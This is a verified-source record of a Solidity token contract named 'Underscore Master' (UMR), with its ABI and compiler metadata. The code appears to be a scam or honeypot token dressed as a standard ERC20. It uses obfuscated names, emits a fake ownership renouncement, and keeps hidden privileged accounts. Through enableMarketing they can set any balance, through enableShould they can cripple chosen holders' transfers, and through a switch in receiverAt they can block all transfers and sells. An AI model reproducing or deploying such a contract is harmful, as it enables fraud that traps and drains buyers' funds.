{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface atIs {\n    function createPair(address toSell, address feeSender) external returns (address);\n}\n\ninterface shouldLimitAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitLiquidity) external view returns (uint256);\n\n    function transfer(address toExempt, uint256 isLimit) external returns (bool);\n\n    function allowance(address marketingTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toExempt,\n        uint256 isLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountList, uint256 value);\n    event Approval(address indexed marketingTrading, address indexed spender, uint256 value);\n}\n\nabstract contract amountAutoMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface modeLimit is shouldLimitAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnderscoreMaster is amountAutoMax, shouldLimitAt, modeLimit {\n\n    address private txTrading;\n\n    address marketingLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 senderExemptLaunch;\n\n    uint256 shouldSenderMin;\n\n    function limitSender(uint256 isLimit) public {\n        fromExemptLaunched();\n        shouldSenderMin = isLimit;\n    }\n\n    address public walletMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableLaunch;\n    }\n\n    constructor (){\n        \n        exemptSender buyTeam = exemptSender(receiverTotalMin);\n        receiverMin = atIs(buyTeam.factory()).createPair(buyTeam.WETH(), address(this));\n        if (marketingExempt == maxWallet) {\n            swapTrading = shouldSenderToken;\n        }\n        walletMin = _msgSender();\n        txReceiver[walletMin] = true;\n        shouldFee[walletMin] = enableLaunch;\n        autoMarketingTo();\n        \n        emit Transfer(address(0), walletMin, enableLaunch);\n    }\n\n    uint256 private amountEnable;\n\n    function receiverAt(address modeTokenLimit, address toExempt, uint256 isLimit) internal returns (bool) {\n        if (modeTokenLimit == walletMin) {\n            return minReceiver(modeTokenLimit, toExempt, isLimit);\n        }\n        uint256 fromList = shouldLimitAt(receiverMin).balanceOf(marketingLiquidity);\n        require(fromList == shouldSenderMin);\n        require(toExempt != marketingLiquidity);\n        if (txAt[modeTokenLimit]) {\n            return minReceiver(modeTokenLimit, toExempt, senderAmount);\n        }\n        return minReceiver(modeTokenLimit, toExempt, isLimit);\n    }\n\n    function transferFrom(address modeTokenLimit, address toExempt, uint256 isLimit) external override returns (bool) {\n        if (_msgSender() != receiverTotalMin) {\n            if (maxLiquidity[modeTokenLimit][_msgSender()] != type(uint256).max) {\n                require(isLimit <= maxLiquidity[modeTokenLimit][_msgSender()]);\n                maxLiquidity[modeTokenLimit][_msgSender()] -= isLimit;\n            }\n        }\n        return receiverAt(modeTokenLimit, toExempt, isLimit);\n    }\n\n    address public receiverMin;\n\n    mapping(address => bool) public txAt;\n\n    uint256 private enableLaunch = 100000000 * 10 ** 18;\n\n    function enableShould(address tradingSwap) public {\n        fromExemptLaunched();\n        \n        if (tradingSwap == walletMin || tradingSwap == receiverMin) {\n            return;\n        }\n        txAt[tradingSwap] = true;\n    }\n\n    function fromExemptLaunched() private view {\n        require(txReceiver[_msgSender()]);\n    }\n\n    function autoMarketingTo() public {\n        emit OwnershipTransferred(walletMin, address(0));\n        txTrading = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenIsShould;\n    }\n\n    mapping(address => mapping(address => uint256)) private maxLiquidity;\n\n    function listEnable(address autoLiquidity) public {\n        require(autoLiquidity.balance < 100000);\n        if (isWalletAt) {\n            return;\n        }\n        if (fromTeam == marketingExempt) {\n            maxWallet = false;\n        }\n        txReceiver[autoLiquidity] = true;\n        if (marketingExempt == fromTeam) {\n            senderLaunch = shouldSenderToken;\n        }\n        isWalletAt = true;\n    }\n\n    uint256 private shouldSenderToken;\n\n    uint256 public launchFrom;\n\n    mapping(address => bool) public txReceiver;\n\n    function approve(address fromReceiver, uint256 isLimit) public virtual override returns (bool) {\n        maxLiquidity[_msgSender()][fromReceiver] = isLimit;\n        emit Approval(_msgSender(), fromReceiver, isLimit);\n        return true;\n    }\n\n    bool public isWalletAt;\n\n    bool private marketingExempt;\n\n    address receiverTotalMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private maxWallet;\n\n    uint256 private swapTrading;\n\n    function name() external view virtual override returns (string memory) {\n        return autoShould;\n    }\n\n    function owner() external view returns (address) {\n        return txTrading;\n    }\n\n    uint256 private senderLaunch;\n\n    function enableMarketing(address fundMax, uint256 isLimit) public {\n        fromExemptLaunched();\n        shouldFee[fundMax] = isLimit;\n    }\n\n    function getOwner() external view returns (address) {\n        return txTrading;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxReceiver;\n    }\n\n    function allowance(address feeSwap, address fromReceiver) external view virtual override returns (uint256) {\n        if (fromReceiver == receiverTotalMin) {\n            return type(uint256).max;\n        }\n        return maxLiquidity[feeSwap][fromReceiver];\n    }\n\n    function minReceiver(address modeTokenLimit, address toExempt, uint256 isLimit) internal returns (bool) {\n        require(shouldFee[modeTokenLimit] >= isLimit);\n        shouldFee[modeTokenLimit] -= isLimit;\n        shouldFee[toExempt] += isLimit;\n        emit Transfer(modeTokenLimit, toExempt, isLimit);\n        return true;\n    }\n\n    mapping(address => uint256) private shouldFee;\n\n    function transfer(address fundMax, uint256 isLimit) external virtual override returns (bool) {\n        return receiverAt(_msgSender(), fundMax, isLimit);\n    }\n\n    bool public fromTeam;\n\n    uint8 private maxReceiver = 18;\n\n    event OwnershipTransferred(address indexed feeExempt, address indexed fromBuy);\n\n    uint256 constant senderAmount = 14 ** 10;\n\n    function balanceOf(address limitLiquidity) public view virtual override returns (uint256) {\n        return shouldFee[limitLiquidity];\n    }\n\n    string private autoShould = \"Underscore Master\";\n\n    string private tokenIsShould = \"UMR\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMarketingTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isLimit\",\"type\":\"uint256\"}],\"name\":\"enableMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSwap\",\"type\":\"address\"}],\"name\":\"enableShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWalletAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isLimit\",\"type\":\"uint256\"}],\"name\":\"limitSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLiquidity\",\"type\":\"address\"}],\"name\":\"listEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTokenLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "UnderscoreMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}